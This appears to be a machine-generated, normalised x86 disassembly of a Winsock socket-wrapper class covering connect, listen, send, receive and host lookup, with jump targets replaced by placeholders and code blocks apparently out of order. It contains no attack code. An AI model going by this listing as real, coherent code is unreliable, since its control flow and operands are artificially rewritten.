mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_3ae29bb
push [ fs : eax ]
mov [ fs : eax ] esp
call WSACleanup
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae29c2
lea eax [ ebp - 0x1c ]
call sub_3a652a0
retn
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_3a6cae0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
mov eax r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x18 ]
push eax
push 0x2
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
sub_3ae29dc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
call sub_3ae2890
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a90e0c
mov [ edi + 0x40 ] eax
movzx eax [ r-xdata ]
mov [ edi + 0x28 ] al
mov [ edi + 0x4 ] esi
mov [ edi + 0x18 ] 0x2
xor eax eax
mov [ edi + 0x1c ] eax
mov [ edi + 0x1a ] 0x0
cmp [ edi + 0x4 ] 0xffffffff
setne al
mov [ edi + 0x8 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ae2a58
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0xffffffff
je r-xdata
mov eax [ esi + 0x40 ]
call sub_3a64380
call sub_3ae293c
mov eax [ esi + 0x44 ]
call sub_3a62efc
xor eax eax
mov [ esi + 0x44 ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
call sub_3a84894
mov edx [ esi + 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ae2ac8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_3ae2d15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x29 ]
sub al 0x1
jb r-xdata
test bl bl
jne r-xdata
je r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29 ] 0x1
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x1c ] edx
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
dec al
je r-xdata
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x44 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29 ] 0x2
movzx eax [ ebp + 0x10 ]
push eax
call htons
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a ] ax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x44 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29 ] 0x0
test bl bl
je r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x456
lea eax [ ebp - 0x8 ]
push eax
mov cl 0x6
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov si 0xfffe
call sub_3a6457c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29 ] 0x1
mov eax edi
call sub_3a65730
push eax
call inet_addr
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] eax
jmp r-xdata
push 0x400
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
push eax
mov eax esi
call sub_3a65730
push eax
push 0x403
mov eax [ ebp - 0x4 ]
call sub_3ae3058
push eax
call WSAAsyncGetHostByName
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] edi
test edi edi
sete al
and eax 0x7f
mov edx r-xdata
call sub_3ae27d8
mov eax [ ebp - 0x4 ]
add eax 0x4c
mov edx [ ebp + 0x14 ]
call sub_3a652f4
mov eax [ ebp - 0x4 ]
movzx edx [ ebp + 0x10 ]
mov [ eax + 0x50 ] dx
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ eax + 0x54 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x52 ] bl
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax 0x400
call sub_3a62ec8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
movzx eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ebx
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3ae2ac8
push 0x400
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
push eax
push r-xdata
mov eax [ ebp + 0x14 ]
call sub_3a65730
push eax
push 0x403
mov eax [ ebp - 0x4 ]
call sub_3ae3058
push eax
call WSAAsyncGetServByName
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] ebx
test ebx ebx
sete al
and eax 0x7f
mov edx r-xdata
call sub_3ae27d8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29 ] 0x2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax 0x400
call sub_3a62ec8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] eax
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3ae2f6c
mov eax [ ebp - 0x4 ]
call sub_3ae2fec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_3ae2da8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0xa ]
test ax ax
je r-xdata
mov bl 0x1
xor ebx ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
movzx eax ax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x8 ]
cmp eax 0x8
jg r-xdata
sub eax 0x10
je r-xdata
je r-xdata
mov al 0x3
jmp r-xdata
sub eax 0x10
je r-xdata
mov al 0x5
jmp r-xdata
dec eax
je r-xdata
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x8 ]
xchg ecx eax
mov si 0xfffe
call sub_3a6457c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov al 0x4
jmp r-xdata
jmp r-xdata
mov al 0x2
jmp r-xdata
dec eax
je r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
jmp r-xdata
sub_3ae2e60
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
push ebp
call sub_3ae2da8
pop ecx
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
cmp eax 0x8
jg r-xdata
sub eax 0x10
je r-xdata
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
jmp r-xdata
sub eax 0x10
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx ]
dec eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
jmp r-xdata
dec eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
jmp r-xdata
sub_3ae2f0c
push ebx
push esi
push edi
push ecx
mov ebx eax
xor esi esi
xor edi edi
movzx eax [ r-xdata ]
cmp al [ ebx + 0x28 ]
je r-xdata
movzx eax [ ebx + 0x28 ]
push eax
push esi
push edi
mov eax [ ebx + 0x4 ]
push eax
call WSAAsyncSelect
movzx eax [ r-xdata ]
cmp al [ ebx + 0x28 ]
jne r-xdata
mov esi 0x401
mov eax ebx
call sub_3ae3058
mov edi eax
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x8004667e
mov eax [ ebx + 0x4 ]
push eax
call ioctlsocket
sub_3ae2f6c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
push 0x10
lea eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call bind
mov edx r-xdata
call sub_3ae27d8
mov eax ebx
call sub_3ae2f0c
cmp edi 0x5
jle r-xdata
mov cl 0x4
mov edx ebx
mov eax ebx
mov si 0xffff
call sub_3a6457c
push edi
mov eax [ ebx + 0x4 ]
push eax
call listen
mov edx r-xdata
call sub_3ae27d8
mov [ ebx + 0x29 ] 0x0
mov [ ebx + 0x8 ] 0x1
pop edi
pop esi
pop ebx
retn
mov edi 0x5
sub_3ae2fec
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3ae2f0c
mov cl 0x1
mov edx ebx
mov eax ebx
mov si 0xffff
call sub_3a6457c
push 0x10
lea eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call connect
mov edx r-xdata
call sub_3ae27d8
mov [ ebx + 0x29 ] 0x0
test [ ebx + 0x28 ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0xffffffff
setne al
mov [ ebx + 0x8 ] al
mov cl 0x2
mov edx ebx
mov eax ebx
mov si 0xffff
call sub_3a6457c
sub_3ae3074
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ae2d90
xor eax eax
push ebp
push sub_3ae30f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3a652a0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call getpeername
mov edx r-xdata
call sub_3ae27d8
push [ ebp - 0x14 ]
call inet_ntoa
mov edx eax
mov eax ebx
call sub_3a65498
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ae2d9c
retn
call sub_3a64ce0
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_3ae311c
push ebx
add esp 0xfffffff8
mov ebx edx
mov eax ebx
call sub_3a65730
push eax
call gethostbyname
mov ebx eax
lea eax [ esp + 0x4 ]
xor ecx ecx
mov edx 0x4
call sub_3a63a44
test ebx ebx
je r-xdata
mov eax [ esp + 0x4 ]
mov [ esp ] eax
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax ebx
mov edx [ eax + 0xc ]
mov edx [ edx ]
movzx ecx [ edx ]
mov [ esp + 0x4 ] cl
movzx ecx [ edx + 0x1 ]
mov [ esp + 0x5 ] cl
movzx ecx [ edx + 0x2 ]
mov [ esp + 0x6 ] cl
movzx eax [ edx + 0x3 ]
mov [ esp + 0x7 ] al
sub_3ae317c
push ebx
mov ebx edx
push r-xdata
mov eax ebx
call sub_3a65730
push eax
call getservbyname
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop ebx
retn
movzx eax [ ebx + 0x8 ]
push eax
call ntohs
movzx eax ax
pop ebx
retn
sub_3ae31b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebx ] 0x2
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_3ae311c
mov [ ebx + 0x4 ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
call inet_addr
mov [ ebx + 0x4 ] eax
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
xor eax eax
mov [ ebx + 0x4 ] eax
jmp r-xdata
movzx eax [ ebp + 0x10 ]
push eax
call htons
mov [ ebx + 0x2 ] ax
mov edx [ ebp + 0x14 ]
mov eax esi
call sub_3ae317c
push eax
call htons
mov [ ebx + 0x2 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_3ae3248
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x2
call socket
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] ebx
inc ebx
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
xor eax eax
push ebp
push sub_3ae3327
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_3a6457c
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
mov eax [ ebp + 0x14 ]
push eax
movzx eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3ae2ac8
mov eax [ ebp + 0x14 ]
push eax
movzx eax [ ebp + 0x10 ]
push eax
push 0x0
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3ae31b0
mov eax [ ebp - 0x4 ]
lea esi [ ebp - 0x18 ]
lea edi [ eax + 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3ae2f6c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_3ae3350
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x2
call socket
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] ebx
inc ebx
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
xor eax eax
push ebp
push sub_3ae342a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_3a6457c
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
mov eax [ ebp + 0x10 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
push 0x0
push 0x1
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3ae2ac8
mov eax [ ebp + 0x10 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3ae31b0
mov eax [ ebp - 0x4 ]
lea esi [ ebp - 0x18 ]
lea edi [ eax + 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
call sub_3ae2fec
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_3ae3450
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ae2d90
xor eax eax
push ebp
push sub_3ae351a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x2c ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2c ] edx
cmp ebx 0xffffffff
je r-xdata
push esi
call WSACancelAsyncRequest
mov edx r-xdata
call sub_3ae27d8
call sub_3a64ce0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x4 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov cl 0x3
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_3a6457c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call closesocket
mov edx r-xdata
call sub_3ae27d8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x1c ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1a ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
add eax 0xc
call sub_3a6efbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ae2d9c
retn
sub_3ae355c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x14 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
push DefWindowProcA
call CallWindowProcA
mov [ esi + 0xc ] eax
sub_3ae35a0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_3ae35d8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
call sub_3a64380
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
mov [ eax + 0xc ] edx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_3ae3620
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ae2d90
xor eax eax
push ebp
push sub_3ae3793
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ae2d9c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0xffffffff
je r-xdata
call sub_3a64ce0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_3a7cb9c
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x1010 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov ecx 0x1000
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jle r-xdata
push ebp
call sub_3ae35d8
pop ecx
push 0x0
push ebx
lea eax [ ebp - 0x1010 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call send
mov edi eax
cmp edi 0xffffffff
jne r-xdata
cmp edi ebx
jge r-xdata
call WSAGetLastError
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x2733
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_3a7cb9c
cmp edx [ esp + 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
add eax edi
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_3a7cbbc
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_3a7cbbc
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov si 0xfffe
call sub_3a6457c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
push ebp
call sub_3ae35d8
pop ecx
mov eax [ ebp - 0x4 ]
movzx edx [ r-xdata ]
cmp dl [ eax + 0x28 ]
je r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
mov [ ebp - 0x5 ] 0x1
call sub_3a6d2f8
jmp r-xdata
push ebp
call sub_3ae35d8
pop ecx
jmp r-xdata
sub_3ae37c4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3ae38e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3ae2d90
xor eax eax
push ebp
push sub_3ae38c9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0x0
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call send
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
call sub_3a64ce0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ae2d9c
retn
call WSAGetLastError
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x2733
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae38ed
lea eax [ ebp - 0x28 ]
call sub_3a652a0
retn
lea eax [ ebp - 0xc ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov si 0xfffe
call sub_3a6457c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_3a6cae0
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0xb
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0x0
mov eax r-xdata
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea eax [ ebp - 0x24 ]
push eax
push 0x2
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
sub_3ae3908
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ ebx + 0x28 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x28 ] al
cmp [ ebx + 0x4 ] 0xffffffff
je r-xdata
mov eax ebx
call sub_3ae2f0c
sub_3ae394c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3ae3abd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3ae2d90
xor eax eax
push ebp
push sub_3ae3aa0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x4004667f
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call ioctlsocket
test eax eax
jne r-xdata
call sub_3a64ce0
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x4004667f
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call ioctlsocket
jmp r-xdata
push 0x0
push ebx
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call recv
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae3ac4
lea eax [ ebp - 0x2c ]
call sub_3a652a0
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ae2d9c
retn
call WSAGetLastError
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x2733
je r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
lea eax [ ebp - 0xc ]
push eax
mov cl 0x2
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov si 0xfffe
call sub_3a6457c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov ebx [ ebp - 0x10 ]
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
call sub_3a6cae0
mov eax [ ebp - 0x2c ]
